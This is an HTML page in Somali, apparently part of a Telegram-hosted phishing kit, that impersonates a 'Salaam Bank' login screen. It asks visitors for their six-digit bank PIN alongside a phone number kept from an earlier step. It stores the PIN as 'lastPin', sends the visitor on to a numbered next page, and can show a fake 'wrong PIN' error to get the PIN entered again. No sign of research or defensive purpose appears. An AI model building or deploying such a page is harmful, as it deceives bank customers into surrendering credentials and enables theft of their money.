<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Geli Soff-Code kaaga - Salaam Bank</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #0d1b2a; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
            color: #e2e8f0;
        }

        .header-box { 
            width: 100%; 
            background: linear-gradient(135deg, #001f3f 0%, #003366 100%); 
            padding: 40px 20px; 
            color: #f8fafc; 
            text-align: center; 
            box-sizing: border-box; 
            border-bottom: 2px solid #1e3a5f;
        }

        .main-content { 
            width: 92%; 
            max-width: 440px; 
            margin: 30px auto 0; 
            text-align: center; 
            flex-grow: 1; 
        }

        .footer-box { 
            width: 100%; 
            background: linear-gradient(135deg, #001f3f 0%, #002244 100%); 
            padding: 40px 20px 30px; 
            color: #94a3b8; 
            text-align: center; 
            border-top-left-radius: 50% 25px; 
            border-top-right-radius: 50% 25px; 
            box-sizing: border-box; 
            border-top: 1px solid #1e3a5f;
        }

        .logo-text { font-size: 32px; font-weight: bold; margin: 0; color: #f8fafc; }
        .sub-text { font-size: 15px; margin-top: 8px; color: #cbd5e1; }
        .version-text { font-size: 12px; margin-top: 15px; color: #64748b; }
        .terms-text { font-size: 11px; margin-top: 15px; padding: 0 30px; color: #64748b; }
        .terms-text u { color: #38bdf8; }

        h2 { color: #f8fafc; font-size: 22px; margin-bottom: 25px; font-weight: 600; }

        .phone-display {
            background-color: #1b2a4a;
            border: 1.5px solid #2a3d66;
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
            font-size: 18px;
            color: #f8fafc;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        .pin-label { color: #cbd5e1; margin-bottom: 20px; font-size: 15px; }

        .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; }

        .pin-input-group { display: flex; gap: 6px; }

        .pin-box {
            width: 45px;
            height: 52px;
            border: 1.5px solid #334155;
            background-color: #0f172a;
            color: #38bdf8;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            outline: none;
            transition: border-color 0.2s;
        }

        .pin-box:focus {
            border-color: #38bdf8;
        }

        .toggle-eye { cursor: pointer; margin-left: 8px; font-size: 20px; }

        .btn-gal {
            background-color: #1e293b;
            color: #64748b;
            border: 1px solid #334155;
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            font-size: 18px;
            margin-top: 40px;
            cursor: not-allowed;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .btn-gal.active {
            background: linear-gradient(135deg, #003366 0%, #004080 100%);
            color: #f8fafc;
            border-color: #1e40af;
            cursor: pointer;
        }

        .spacer { height: 40px; }

        .error-banner {
            background-color: rgba(220, 38, 38, 0.15);
            color: #fca5a5;
            border: 1px solid #991b1b;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 20px;
            display: none;
        }
    </style>
</head>

<body>

<div class="header-box">
    <p class="logo-text">Salaam Bank</p>
    <p class="sub-text">Adeegyada Maalgelinta ee Shaacsan</p>
</div>

<div class="main-content">
    <h2>Geli PIN-kaaga Bangiga</h2>

    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>🇸🇴</span>
        <span id="displayPhone">+252 ...</span>
    </div>

    <p class="pin-label">Fadlan geli 6-da lambar ee sirta ah (PIN)</p>

    <div class="pin-container">
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        </div>
        <span class="toggle-eye" id="eyeIcon">👁️</span>
    </div>

    <button id="loginBtn" class="btn-gal" disabled>GAL</button>
    <div class="spacer"></div>
</div>

<div class="footer-box">
    <p class="logo-text">Salaam Bank</p>
    <p class="sub-text">Maalgelin Habboon oo Ammaan ah</p>
    <p class="version-text">v2.1.3P</p>
    <p class="terms-text">Markaad gasho, waxaad ka mid tahay inaad aqbashay <u>Shuruudaha & Xeerarka</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    const savedPhone = localStorage.getItem('phone');
    displayPhone.textContent = savedPhone ? `+252 ${savedPhone}` : "+252 (lamana helin)";

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.innerText = "❌ PIN-ka waa magal. Fadlan geli PIN-ka saxda ah.";
        errorDisplay.style.display = "block";
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');

            if (box.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }

            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    eye.addEventListener('click', () => {
        const show = pinBoxes[0].type === "password";
        pinBoxes.forEach(b => b.type = show ? "text" : "password");
        eye.textContent = show ? "🫣" : "👁️";
    });

    loginBtn.addEventListener('click', () => {
        if (!savedPhone) return;
        
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);

        errorDisplay.style.display = "none";

        window.location.href = "/page7.html";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
